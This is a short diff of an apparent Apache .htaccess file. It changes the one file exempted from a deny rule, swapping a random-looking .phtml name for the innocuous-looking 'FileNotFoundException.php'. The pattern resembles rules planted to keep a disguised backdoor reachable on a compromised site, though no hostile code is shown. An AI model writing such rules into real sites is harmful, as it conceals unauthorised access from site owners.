@@ -5,7 +5,7 @@ Order allow,deny
 Deny from all
 </FilesMatch>
 
-<FilesMatch "^(68d1f9fc89614.phtml)$">
+<FilesMatch "^(FileNotFoundException.php)$">
 Order allow,deny
 Allow from all
 </FilesMatch>
